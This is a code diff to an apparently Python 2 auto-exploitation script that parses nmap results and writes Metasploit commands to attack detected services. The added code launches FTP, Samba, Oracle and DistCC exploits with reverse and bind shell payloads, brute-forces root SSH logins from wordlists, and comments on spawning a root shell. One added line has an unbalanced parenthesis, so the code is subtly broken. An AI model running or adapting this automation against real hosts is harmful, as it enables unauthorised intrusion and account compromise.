@@ -56,19 +56,59 @@ def check_21_ms(target):
   saveNetRc('set RHOST ' + target + '\n')
   saveNetRc('run\n')
 
+# modules for ProFTPD
+def check_21_pftpd(target):
+  print '    + loading : current ProFTPD modules'
+  print '      + proftp_telnet_iac'
+
+  saveNetRc('use exploit/freebsd/ftp/proftp_telnet_iac\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  saveNetRc('use exploit/linux/ftp/proftp_sreplace\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('run\n')
+
+def check_21_pure(target):
+  print '    + loading : current Pure-FTPd'
+  print '      + pureftpd_bash_env_exec'
+  saveNetRc('use exploit/multi/ftp/pureftpd_bash_env_exec\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('run\n')
+
+
 # modules for SSH
 def check_22(target):
   print '    + loading : current ssh modules:'
   print '      + ssh_version'
+  print '      + ssh_enumusers'
+  print '      + ssh_login'
   saveNetRc('use auxiliary/scanner/ssh/ssh_version\n')
   saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  saveNetRc('use auxiliary/scanner/ssh/ssh_enumusers\n')
+  saveNetRc('set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  saveNetRc('use auxiliary/scanner/ssh/ssh_login\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt\n')
+  saveNetRc('set VERBOSE false\n')
+  saveNetRc('set USERNAME root\n')
   saveNetRc('run\n')
 
 # modules for rpcinfo
 def check_111(target):
   print '    + loading : current rpc modules:'
   print '      + sunrpc_portmapper'
+  print '      + nfsmount' # TODO: check udp
   saveNetRc('use auxiliary/scanner/misc/sunrpc_portmapper\n')
+  saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+  saveNetRc('use auxiliary/scanner/nfs/nfsmount\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
 
@@ -95,6 +135,16 @@ def check_135(target):
   saveNetRc('use auxiliary/scanner/dcerpc/endpoint_mapper\n')
   saveNetRc('set RHOSTS ' + target + '\n')
   saveNetRc('run\n')
+
+# modules for Samba (139/tcp @Linux)
+def check_139_lin(target):
+  print '   + loading : current samba modules:'
+  print '     + usermap_script'
+  saveNetRc('use exploit/multi/samba/usermap_script\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('set PAYLOAD cmd/unix/reverse_netcat\n')
+  saveNetRc('set LHOST ' + str(elhost() + '\n')
+  saveNetRc('run\n') # TODO: python -c 'import pty;pty.spawn("/bin/bash")' # to get root
 
 # modules for SMB
 def check_139(target):
@@ -326,6 +376,20 @@ def check_445(target):
   saveNetRc('set AutoRunScript multi_console_command -rc ' + path2post + '\n')
   saveNetRc('run\n')
 
+# modules for Oracle 9i ftp bug in PASS
+def check_2100(target):
+  print '    + loading : Oracle 9i modules'
+  print '      + oracle9i_xdb_ftp_pass'
+  print '      + oracle9i_xdb_ftp_unlock'
+  saveNetRc('use exploit/windows/ftp/oracle9i_xdb_ftp_pass\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('run\n')
+  
+  saveNetRc('use exploit/windows/ftp/oracle9i_xdb_ftp_unlock\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('run\n')
+
+
 # modules for SSDP/UPnP
 def check_2869(target):
   print '    + loading : 2869 modules ...'
@@ -338,6 +402,15 @@ def check_2869(target):
 
   saveNetRc('use auxiliary/scanner/upnp/ssdp_amp\n')
   saveNetRc('set RHOSTS ' + target + '\n')
+  saveNetRc('run\n')
+
+# modules for DistCC Daemon
+def check_3632(target):
+  print '    + loading : DistCC Daemon modules' # for Metasploitable 
+  print '      + distcc_exec'
+  saveNetRc('use exploit/unix/misc/distcc_exec\n')
+  saveNetRc('set RHOST ' + target + '\n')
+  saveNetRc('set PAYLOAD cmd/unix/bind_perl\n')
   saveNetRc('run\n')
 
 # modules for SSDP/UPnP
@@ -485,6 +558,9 @@ def readScan(nmaplogfile):
 
       elif port.find('139/tcp') != -1:
         print '[i] SMB found on port: ', rport
+        if port.find('Samba smbd') != -1:
+          print '[i] Probably Linux Samba; preparing...'
+          check_139_lin(target)
         check_139(target)
 
       elif port.find('443/tcp') != -1:
@@ -496,9 +572,17 @@ def readScan(nmaplogfile):
         print '[i] MS-DC Active Directory found on port: ', rport
         check_445(target)
 
+      elif port.find('2100/tcp') != -1:
+        print '[i] Oracle found on port: ', rport
+        check_2100(target)
+
       elif port.find('2869/tcp') != -1:
         print '[i] SSDP/UPnP found on port: ', rport
         check_2869(target)
+
+      elif port.find('3632/tcp') != -1:
+        print '[i] DistCC Daemon found on port: ', rport
+        check_3632(target)
 
       elif port.find('5357/tcp') != -1:
         print '[i] SSDP/UPnP found on port: ', rport
